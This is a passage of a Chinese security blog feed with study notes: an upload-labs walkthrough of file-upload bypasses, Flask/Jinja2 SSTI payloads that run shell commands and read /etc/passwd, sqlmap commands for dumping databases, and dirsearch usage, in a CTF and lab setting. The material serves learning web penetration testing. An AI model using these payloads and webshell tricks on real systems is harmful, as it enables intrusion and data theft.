id="通过外部库攻击">2.3 通过外部库攻击</h2><p>程序通常使用来自外部库的函数。如果这些函数使用环境变量，则它们会添加到攻击表面.</p><h2 id="通过应用程序代码攻击">2.4 通过应用程序代码攻击</h2><ul><li>程序可以直接使用环境变量。如果这些是特权程序，它可能会导致不可信任的输入.</li><li>当从shell执行命令时，将创建一个新的进程.shell使用shell变量设置这个新进程的环境变量PWD.因此，该值可以被用户篡改.如果这个程序是一个Set-UID，用户可以通过将PWD变量设置为一个任意的长字符串来利用它.攻击者可以进一步利用缓冲区溢出来获得特权.</li></ul><h2 id="服务方法">2.5 服务方法</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310250937985.png"alt="image-20231025093450923" /><figcaption aria-hidden="true">image-20231025093450923</figcaption></figure><ul><li>Set-UID方法：普通用户必须运行一个特殊的程序才能临时获得根权限.不能信任环境变量.</li><li>服务方法：普通用户必须请求特权服务才能为他们执行操作.可以信任环境变量.</li><li>从功能的角度来看，Set-UID的性能更好。这是因为它不需要一个正在运行的后台进程；从安全的角度来看，Set-UID方法具有更广泛的攻击面.</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
      <category>理论篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs</title>
    <link href="/2023/10/23/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/upload-labs/"/>
    <url>/2023/10/23/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/upload-labs/</url>
    
    <content type="html"><![CDATA[<h1 id="引言">引言</h1><p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场.旨在帮助大家对上传漏洞有一个全面的了解.目前一共20关，每一关都包含着不同上传方式.</p><p><strong>注意：</strong></p><p>每一关没有固定的通关方法，大家不要自限思维！</p><p><strong>漏洞类型分类</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251547692.png"alt="image-20231023135621979" /><figcaption aria-hidden="true">image-20231023135621979</figcaption></figure><p><strong>如何判断上传漏洞</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310251549661.png"alt="image-20231023135738427" /><figcaption aria-hidden="true">image-20231023135738427</figcaption></figure><h1 id="pass-01">Pass-01</h1><ul><li>提示：在客户端使用js对不合法图片进行检查</li><li>绕过方法：<ul><li>禁用JavaScript</li><li>先将webshell修改为合法后缀，上传过程中使用burp抓包拦截，修改后缀为php</li></ul></li></ul><h1 id="pass-02">Pass-02</h1><ul><li>提示：在服务端对数据包的MIME进行检查</li><li>绕过方法：利用burp抓包修改webshell的Content-Type为服务器允许的类型</li><li>媒体类型（通常称为 Multipurpose Internet Mail Extensions 或 MIME类型）是一种标准，用来表示文档、文件或字节流的性质和格式</li></ul><table><thead><tr class="header"><th style="text-align: left;">类型</th><th style="text-align: left;">描述</th><th style="text-align: left;">典型示例</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;"><code>text</code></td><td style="text-align: left;">表明文件是普通文本，理论上是人类可读</td><td style="text-align: left;"><code>text/plain</code>,<code>text/html</code>, <code>text/css, text/javascript</code></td></tr><tr class="even"><td style="text-align: left;"><code>image</code></td><tdstyle="text-align: left;">表明是某种图像.不包括视频，但是动态图（比如动态gif）也使用image类型</td><td style="text-align: left;"><code>image/gif</code>,<code>image/png</code>, <code>image/jpeg</code>, <code>image/bmp</code>,<code>image/webp</code>, <code>image/x-icon</code>,<code>image/vnd.microsoft.icon</code></td></tr><tr class="odd"><td style="text-align: left;"><code>audio</code></td><td style="text-align: left;">表明是某种音频文件</td><td style="text-align: left;"><code>audio/midi</code>,<code>audio/mpeg, audio/webm, audio/ogg, audio/wav</code></td></tr><tr class="even"><td style="text-align: left;"><code>video</code></td><td style="text-align: left;">表明是某种视频文件</td><td style="text-align: left;"><code>video/webm</code>,<code>video/ogg</code></td></tr><tr class="odd"><td style="text-align: left;"><code>application</code></td><td style="text-align: left;">表明是某种二进制数据</td><td style="text-align: left;"><code>application/octet-stream</code>,<code>application/pkcs12</code>,<code>application/vnd.mspowerpoint</code>,<code>application/xhtml+xml</code>, <code>application/xml</code>,<code>application/pdf</code></td></tr></tbody></table><h1 id="pass-03">Pass-03</h1><ul><li>提示：禁止上传<code>.asp|.aspx|.php|.jsp</code>后缀文件</li><li>绕过方法：<ul><li>使用php文件其它扩展名：<code>.phtml .phps .php5 .pht</code>.可以成功上传，但没有作为php代码执行，这与中间件对于文件类型的解析规则有关.</li><li>构造<code>::$DATA</code>.例：<code>shell.php::$DA::$DATATA</code>.</li></ul></li><li>Windows保存文件过程中如果出现文件名+<code>::$DATA</code>，会认<code>::$DATA</code>是NTFS文件流的一部分，将其清除.例如：<code>phpinfo.php::$DATA</code>,Windows会自动去掉末尾的<code>::$DATA</code>使其变成<code>phpinfo.php</code>.</li></ul><h1 id="pass-04">Pass-04</h1><ul><li><p>提示：禁止上传<code>.php|.php5|.php4|.php3|……</code>后缀文件</p></li><li><p>绕过方法：先上传一个<code>.htaccess</code>配置文件，增添解析规则，再上传webshell.可以成功上传，但没有生效，这与中间件的配置文件有关.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;shell.png&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br></code></pre></td></tr></table></figure></li><li><p><code>.htaccess</code>基础知识：<code>.htaccess</code>可以帮我们实现：文件夹密码保护、用户自动重定向、自定义错误页面、改变文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能.<code>.htaccess</code>文件相当于一种部分配置文件，好比局部变量一样，只在当前目录生效.</p></li></ul><h1 id="pass-05">Pass-05</h1><ul><li>提示：禁止上传<code>.php|.php5|.php4|.php3|……|.htaccess</code>后缀文件</li><li>绕过方法：大小写绕过，修改后缀为<code>PHP</code>即可</li></ul><h1 id="pass-06">Pass-06</h1><ul><li>提示：禁止上传<code>.php|.php5|.php4|.php3|……</code>后缀文件</li><li>绕过方法：<ul><li>空格绕过：文件末尾加空格</li><li>构造<code>::$DATA</code></li></ul></li><li>空格绕过原理：window 操作系统保存文件过程中空格会被作为空处理</li></ul><h1 id="pass-07">Pass-07</h1><ul><li>提示：禁止上传所有可以解析的后缀！</li><li>绕过方法：点绕过：文件末尾加<code>.</code>若不成功，可以加<code>..</code>(php版本问题)</li><li>点绕过原理：window操作系统保存文件过程中文件后缀名末尾的点会被自动去除</li></ul><h1 id="pass-08">Pass-08</h1><ul><li>提示：禁止上传<code>.php|.php5|.php4|.php3|……|.htaccess</code>后缀文件</li><li>绕过方法：::<spanclass="math inline">\(DATA绕过.例：`shell.php::\)</span>DATATA`</li></ul><h1 id="pass-09">Pass-09</h1><ul><li>提示：只允许上传<code>.jpg|.png|.gif</code>后缀的文件</li><li>绕过方法：构造<code>shell.php. .</code></li><li>原理：deldot()从字符串的尾部开始，从后向前删除点<code>.</code>，直到该字符串的末尾字符不是<code>.</code>为止.加上它没有进行循环验证，也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次.</li></ul><h1 id="pass-10">Pass-10</h1><ul><li>提示：会从文件名中去除<code>.php|.php5|.php4|.php3|......|.htaccess</code>字符</li><li>绕过方法：源码中对非法后缀进行了替换，但只替换了一次，构造<code>shell.pphphp</code></li></ul><h1 id="pass-11">Pass-11</h1><ul><li>提示：上传路径可控</li><li>绕过方法：使用%00截断，构造<code>shell.php%00</code>，同时修改shell为合法后缀</li><li>原理：00 截断是操作系统层的漏洞，由于操作系统是 C语言或汇编语言编写的，这两种语言在定义字符串时，都是以\0作为字符串的结尾.</li></ul><h1 id="pass-12">Pass-12</h1><ul><li>提示：上传路径可控</li><li>绕过方法：使用%00截断，但接收值变成了 post,区别就是 get会自行解码，post 不会自行解码，因此我们需要对%00 进行url解码</li></ul><h1 id="pass-13">Pass-13</h1><ul><li>提示：检查图标内容开头2个字节</li><li>绕过方法：图片马+文件包含漏洞</li><li>图片马制作：<code>copy picName.jpg /b + shellName.php /a webshell.jpg</code></li></ul><h1 id="pass-14">Pass-14</h1><ul><li>提示：使用getimagesize()检查是否为图片文件</li><li>绕过方法：图片马+文件包含漏洞</li><li>getimagesize()：会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求</li></ul><h1 id="pass-15">Pass-15</h1><ul><li>提示：使用exif_imagetype()检查是否为图片文件</li><li>绕过方法：图片马+文件包含漏洞</li><li>exif_imagetype()：读取一个图像的第一个字节并检查其签名，如果发现了恰当的签名则返回一个对应的常量，否则返回FALSE.</li></ul><h1 id="pass-16">Pass-16</h1><ul><li>提示：重新渲染了图片</li><li>绕过方法：把一句话木马插入到图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉</li><li>二次渲染原理：在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示.<strong>判断是否经过二次渲染</strong>：对比要上传图片与上传后的图片大小</li></ul><h1 id="pass-17">Pass-17</h1><ul><li>提示：需要代码审计</li><li>绕过方法：条件竞争(需要burp专业版).审计代码发现服务器先是将上传的文件保存下来，然后将文件的后缀名同白名单对比，如果是jpg、png、gif中的一种，就将文件进行重命名.如果不符合的话，unlink()函数就会删除该文件.</li><li>条件竞争原理：当我们成功上传了php文件，服务端会在短时间内将其删除，我们需要抢在它删除之前访问文件并生成一句话木马文件，所以访问包的线程需要大于上传包的线程（均为较大值，如500）.</li></ul><h1 id="pass-18">Pass-18</h1><ul><li>提示：需要代码审计</li><li>绕过方法：条件竞争.从源码来看的话，服务器先是将文件后缀跟白名单做了对比，然后检查了文件大小以及文件是否已经存在.文件上传之后又对其进行了重命名.</li></ul><h1 id="pass-19">Pass-19</h1><ul><li>提示：取文件名通过$_POST来获取</li><li>绕过方法：<ul><li>move_uploaded_file()特性，会忽略掉文件末尾的/.，构造<code>upload-19.php/.</code></li><li>00截断</li></ul></li></ul><h1 id="pass-20">Pass-20</h1><ul><li>提示：审计代码</li><li>绕过方法：构造数组</li><li>验证过程：<ul><li>验证上传路径是否存在</li><li>验证['upload_file']的content-type是否合法（可以抓包修改）</li><li>判断POST参数是否为空定义file变量（关键：构造数组绕过下一步的判断）</li><li>判断file不是数组则使用<code>explode('.', strtolower($file))</code>对file进行切割，将file变为一个数组</li><li>判断数组最后一个元素是否合法</li><li>数组第一位和<code>$file[count($file) - 1]</code>进行拼接，产生保存文件名file_name</li><li>上传文件</li></ul></li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略（全）- 清茶先生 - 博客园 (cnblogs.com)</a></li><li><ahref="https://blog.csdn.net/weixin_47598409/article/details/115050869">【精选】Upload-labs1-21关 靶场通关攻略(全网最全最完整)_upload靶场-CSDN博客</a></li><li><ahref="https://blog.csdn.net/weixin_45588247/article/details/119177948">【精选】【文件上传绕过】——二次渲染漏洞_二次渲染绕过-CSDN博客</a></li><li><ahref="https://note.youdao.com/ynoteshare/index.html?id=c38d0024e15fd3edf7a7dfbf9d0aecd0&amp;type=note&amp;_time=1689208551643">有道云笔记(youdao.com)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>模板注入</title>
    <link href="/2023/10/19/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/10/19/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="flask基础">1 flask基础</h1><p><strong>路由</strong>：route装饰器的作用是将函数与url绑定起来。例子中的代码的作用就是当你访问http://127.0.0.1:5000/index的时候，flask会返回helloword。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> flask <br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_word</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello word&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>渲染方法：</strong></p><p>render_template()：用来渲染一个指定的文件。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">return</span> <span class="hljs-function"><span class="hljs-title">render_template</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>render_template_string()：用来渲染一个字符串。SSTI与这个方法密不可分</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">html</span> = <span class="hljs-string">&#x27;&lt;h1&gt;This is index page&lt;/h1&gt;&#x27;</span><br><span class="hljs-variable">return</span> <span class="hljs-function"><span class="hljs-title">render_template_string</span>(<span class="hljs-variable">html</span>)</span><br></code></pre></td></tr></table></figure><p><strong>模板：</strong></p><p>flask是使用Jinja2来作为渲染引擎的。在网站的根目录下新建<code>templates</code>文件夹，这里是用来存放html文件，也就是模板文件。</p><h1 id="ssti文件读取命令执行">2 SSTI文件读取/命令执行</h1><p><strong>定义：</strong>SSTI 就是服务器端模板注入（Server-SideTemplate Injection）</p><p><strong>基础知识</strong>：在Jinja2模板引擎中，<code>&#123;&#123;&#125;&#125;</code>是变量包裹标识符。<code>&#123;&#123;&#125;&#125;</code>并不仅仅可以传递变量，还可以执行一些简单的表达式。</p><p><strong>实现思路</strong>：通过python的对象的继承来一步步实现文件读取和命令执行。找到父类&lt;type'object'&gt;--&gt;寻找子类--&gt;找关于命令执行或者文件操作的模块。</p><p><strong>几个魔术方法</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__class__</span>  返回类型所属的对象<br><span class="hljs-strong">__mro__</span>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><span class="hljs-strong">__base__</span>   返回该对象所继承的基类<br>// <span class="hljs-strong">__base__</span>和<span class="hljs-strong">__mro__</span>都是用来寻找基类的<br><br><span class="hljs-strong">__subclasses__</span>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class="hljs-strong">__init__</span>  类的初始化方法<br><span class="hljs-strong">__globals__</span>  对包含函数全局变量的字典的引用<br></code></pre></td></tr></table></figure><p>1 、获取字符串的类对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;&#x27;</span>.__class__<br>&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p>2 、寻找基类</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span><br>(&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;object&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure><p>3 、寻找可用引用</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()<br></code></pre></td></tr></table></figure><p>4、进行利用</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">type</span> &#x27;<span class="hljs-attr">file</span>&#x27;&gt;</span>类型(可以进行文件读取)</span><br><span class="language-xml"># python调用Shell脚本，有两种方法：os.system()和os.popen(),</span><br><span class="language-xml"># 前者返回值是脚本的 退出状态码，后者的返回值是脚本执行过程中的 输出内容</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">class</span> ‘<span class="hljs-attr">site._Printer</span>’&gt;</span>类型（可以进行命令执行）</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(<span class="hljs-name">&#x27;.&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">--&gt;URL http://61.147.171.105:56698/[&#x27;index.py&#x27;, &#x27;fl4g&#x27;] not found</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[40](<span class="hljs-name">&#x27;fl4g&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">--&gt;URL http://61.147.171.105:56698/ctf&#123;f22b6844-5169-4054-b2a0-d95b9361cb57&#125; not found</span><br></code></pre></td></tr></table></figure><p><strong>常用payload：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[71]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;cat fl4g&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[71]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>)<br><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__<span class="hljs-selector-attr">[2]</span>.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2023/10/19/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/sqlmap/"/>
    <url>/2023/10/19/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/sqlmap/</url>
    
    <content type="html"><![CDATA[<h1 id="常用参数">1 常用参数</h1><p>● -r:以递归方式扫描指定目录下的所有文件（包含<strong>http请求</strong>）。 ●-u :连接目标网站并进行扫描。 ●-m:从文件中取出保存的<strong>url</strong>进行检测。 ●-dbs：列出数据库的名称。 ● --tables：列出数据库中的所有表。 ●--columns：列出指定表中的所有列。 ● --dump：导出指定表中的数据。</p><h1 id="get注入">2 GET注入</h1><ol type="1"><li><p>监测是否存在注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">sqlmap -u <span class="hljs-string">&quot;http://xxxx/?id=1&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>获取数据库名称</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://xxxx/?id=1&quot; <span class="hljs-operator">-</span>dbs<br></code></pre></td></tr></table></figure></li><li><p>获取表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://xxxx/?id=1&quot; <span class="hljs-operator">-</span>D xxxx <span class="hljs-comment">--tables</span><br></code></pre></td></tr></table></figure></li><li><p>获取列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sqlmap <span class="hljs-operator">-</span>u &quot;http://xxxx/?id=1&quot; <span class="hljs-operator">-</span>D xxxx <span class="hljs-operator">-</span>T xxxx <span class="hljs-comment">--columns</span><br></code></pre></td></tr></table></figure></li><li><p>获取字段内容</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap -u <span class="hljs-string">&quot;http://xxxx/?id=1&quot;</span> -D xxxx -T xxxx -C xxxx(逗号隔开) --<span class="hljs-keyword">dump</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="post注入">3 POST注入</h1><p>1.获取注入点</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.161</span>:<span class="hljs-number">53459</span> --data <span class="hljs-string">&quot;search=df&quot;</span><br></code></pre></td></tr></table></figure><p>2.获取数据库信息</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">100.161</span>:<span class="hljs-number">53459</span> --data <span class="hljs-string">&quot;search=df&quot;</span> -dbs<br></code></pre></td></tr></table></figure><p>3.获取库内表信息</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u http:<span class="hljs-string">//192.168.100.161</span><span class="hljs-function">:53459</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=df&quot;</span> -D news <span class="hljs-params">--tables</span><br></code></pre></td></tr></table></figure><p>4.获取表内字段信息</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u http:<span class="hljs-string">//192.168.100.161</span><span class="hljs-function">:53459</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=df&quot;</span> -D news -T secret_table <span class="hljs-params">--columns</span><br></code></pre></td></tr></table></figure><p>5.获取字段内容，得到flag</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">sqlmap -u http:<span class="hljs-string">//192.168.100.161</span><span class="hljs-function">:53459</span> <span class="hljs-params">--data</span> <span class="hljs-string">&quot;search=df&quot;</span> -D news -T secret_table -C <span class="hljs-string">&quot;fl4g&quot;</span> <span class="hljs-params">--dump</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>渗透测试工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>dirsearch</title>
    <link href="/2023/10/18/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/dirsearch/"/>
    <url>/2023/10/18/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/dirsearch/</url>
    
    <content type="html"><![CDATA[<h1 id="常见用法">常见用法</h1><ul><li>dirsearch -u https://xxxx 扫描某个站点</li><li>dirsearch -u https://xxxx -r 递归扫描</li><li>dirsearch -u https://xxxx -r -t 30 线程控制请求速率扫描</li><li>dirsearch -u https://xxxx -r -t 30 --proxy 127.0.0.1:8080使用代理进行扫描</li></ul>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>渗透测试工具</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP序列化和反序列化</title>
    <link href="/2023/10/18/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/10/18/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="序列化">1 序列化</h1><p>概念：在PHP中，序列化用于存储或传递 PHP的值的过程中，同时不丢失其类型和结构。</p><p>当调用<code>serialize()</code>函数序列化对象时，该函数会检查类中是否存在一个魔术方法<code>__sleep()</code>。如果存在，该方法会先被调用，然后才执行序列化操作。可以通过重载这个方法，从而自定义序列化行为。</p><p>public：属性被序列化的时候属性名会变成 <code>属性名</code></p><p>protected：属性被序列化的时候属性名会变成<code>\x00*\x00属性名</code></p><p>private：属性被序列化的时候属性名会变成<code>\x00类名\x00属性名</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">People</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$gender</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$age</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;id = <span class="hljs-string">&#x27;WuFei666&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;gender = <span class="hljs-string">&#x27;male&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-string">&#x27;18&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">People</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//输出结果</span><br>O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;People&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;WuFei666&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot; * gender&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;male&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot; People age&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;18&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>序列化对于不同类型得到的字符串格式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 